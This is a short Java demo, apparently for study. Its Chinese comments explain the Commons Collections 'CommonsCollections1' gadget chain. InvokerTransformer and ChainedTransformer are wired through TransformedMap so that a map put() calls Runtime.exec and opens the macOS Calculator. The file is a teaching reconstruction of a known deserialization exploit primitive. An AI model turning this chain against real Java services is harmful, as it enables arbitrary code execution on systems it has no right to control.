package com.SugarP1g.deserialization.CommonsCollections.CommonCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class Demo {
    public static void main(String[] args) throws Exception {
        // TransformedMap用于对Java标准数据结构Map做一个修饰。
        // 被修饰过的Map在添加新的元素时，将可以执行一个回调。
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                // InvokerTransformer是实现了Transformer接口的一个类，这个类可以用来执行任意方法。
                // 这也是反序列化能执行任意代码的关键。
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };

        // ChainedTransformer也是实现了Transformer接口的一个类，它的作用是将内部的多个Transformer串在一起。
        // 通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        // TransformedMap在转换Map的新元素时，就会调用transform方法。
        // 这个过程就类似在调用一个”回调函数“，这个回调的参数是原始对象。
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
